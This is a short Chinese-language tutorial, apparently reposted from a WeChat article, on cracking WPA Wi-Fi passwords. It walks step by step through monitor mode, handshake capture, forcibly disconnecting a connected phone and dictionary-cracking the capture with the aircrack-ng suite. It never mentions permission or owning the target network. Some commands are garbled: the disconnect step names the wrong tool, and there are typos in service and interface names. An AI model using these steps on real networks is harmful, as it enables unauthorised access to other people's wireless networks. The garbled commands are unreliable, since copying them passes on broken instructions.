# (五)无线渗透之WPA密码破解

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzI5MTM4NzYwNw==&mid=2247483652&idx=1&sn=3539578e9dfc79770c74f0b576bb64e2&chksm=ec1020bcdb67a9aa08ad919db6dadc71313646892aa70c6327865b4293731f81f53e15160f4c&scene=126&sessionid=1681663751#rd](http://mp.weixin.qq.com/s?__biz=MzI5MTM4NzYwNw==&mid=2247483652&idx=1&sn=3539578e9dfc79770c74f0b576bb64e2&chksm=ec1020bcdb67a9aa08ad919db6dadc71313646892aa70c6327865b4293731f81f53e15160f4c&scene=126&sessionid=1681663751#rd)

WPA作为目前无线最主流的加密系统，可以说是安全度非常高。目前针对WPA加密的无线，我们只能通过暴力破解的方式进行破解。下面来做演示。

首先还是老规矩，将不必要的进程关闭，并将网卡置入侦听模式。

service network-mannager stop

airmon-ng check kill

airmon-ng start wlan0

![](../Images/270f1310e99e29988c195ca4d3a27959.png)

开始抓包并保存抓包数据。

airodump-ng wlan0mon –bssid ECxxxxxxxxB6 -c 11 -w wpa

![](../Images/e877a0fb23680915361ea4a912a09eee.png)

此时当我用手机对WPA加密的AP进行连接后，如果抓包正常抓去了连接过程，则会在右上角显示 握手包抓取成功提示！这里我们可以看到并没有抓取到！这和无线网络本身不稳定有关。

![](../Images/51db7cf44590ac45d955595f00ed8d2d.png)

为了成功抓取到握手包，我们可以采用 aireplay-ng 来强制让手机客户端与AP断开，进行重新连接！

airodump-ng -0 2 -a ECxxxxxxxxxB6 -c 68xxxxxxxxAA waln0mon

这里我们使其进行了两次重连。

![](../Images/096c8c63f607bd4ef9fdb3d3a24bad96.png)

我们回到抓包界面，此时我们可以看到已经成功抓取到握手信息。

![](../Images/39bc4dfc8b360f6f2dd8769528fcbb5c.png)

拿到了握手包后，下面我们就可以正式开始破解了。

aircrack-ng -w /usr/share/john/password.lst wpa-01.cap

![](../Images/94f42fb7e4322d460fb1e819c28ad052.png)

很快密码就被破解出来了 Password ！

![](../Images/bb1f18b708ac55c7c7bd5db9c993798f.png)
